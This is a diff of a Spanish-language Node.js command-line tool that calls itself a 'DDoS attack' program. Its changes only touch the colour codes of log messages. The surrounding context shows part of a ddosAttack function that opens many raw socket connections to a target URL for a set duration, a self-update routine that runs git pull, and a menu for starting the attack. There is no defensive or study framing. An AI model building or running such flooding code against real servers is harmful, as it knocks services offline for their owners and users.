@@ -42,7 +42,7 @@ italic: '[3m',
 
 const ddosAttack = async (url, numConnections, attackDuration) => {
 try {
-console.log(`${colors.fg.green}Iniciando ataque DDoS...${colors.reset}`);
+console.log(`[36m Iniciando ataque DDoS...`);
 const sockets = [];
 for (let i = 0; i < numConnections; i++) {
 const socket = new net.Socket();
@@ -69,13 +69,13 @@ console.error(`Error: ${error}`);
 
 const updateCode = async () => {
 try {
-console.log(`${colors.fg.green}Actualizando código...${colors.reset}`);
+console.log(`[36m Actualizando código...`);
 const exec = require('child_process').exec;
 exec('git pull origin main', (error, stdout, stderr) => {
 if (error) {
 console.error(`Error: ${error}`);
 } else {
-console.log(`${colors.fg.green}Código actualizado correctamente!${colors.reset}`);
+console.log(`[36m Código actualizado correctamente!`);
 }
 });
 } catch (error) {
@@ -85,7 +85,7 @@ console.error(`Error: ${error}`);
 
 const showMenu = () => {
 console.clear(); // Limpiar la consola
-console.log(`[31m [1m        DDoS attack     `);
+console.log(`[31m        DDoS attack     `);
 console.log(`⭐️ Desarrollado por Keiji821`);
 console.log(`[36m⸂⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⸃`);
 console.log(`[36m 1. Iniciar ataque DDoS`);
